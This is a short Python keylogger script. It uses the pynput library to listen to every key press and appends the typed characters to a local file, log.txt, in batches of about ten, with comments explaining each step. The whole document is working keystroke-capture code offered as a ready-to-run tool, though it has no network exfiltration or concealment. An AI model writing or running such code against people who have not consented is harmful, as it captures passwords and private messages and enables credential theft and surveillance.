'''
if this package is not installed:
pip install pynput
'''
from pynput import keyboard
import re


class KeyLogger(): # creating new class
    count=0
    keys=[]


    def on_press(self, key):
        self.count+=1 # count the number of entered characters

        if str(key) == 'Key.space': # replace Key.space with a 'space'
            self.keys.append(' ')

        else:
            find = re.match('Key.', str(key)) # looking for buttons with a prefix 'Key.' like Key.shift, Key.enter

            if find == None: # if not found then add the letter to the list
               self.keys.append(str(key).replace("'", ""))

               if self.count >= 10: # when the number of letters in the list is more than 9, then we write all the letters to the file
                   with open("log.txt", 'a') as logs: # paste the filename here, dont forget to include the path to the file
                        for _ in self.keys:
                          logs.write(_)
                   self.count=0 # you need to zero the number of characters and the array itself
                   self.keys.clear()


    def main(self): # starting keylogger
        listener = keyboard.Listener(
            on_press=self.on_press,
        )
        listener.start()


if __name__ == '__main__': # starting programm
    logger = KeyLogger()
    logger.main()
    input()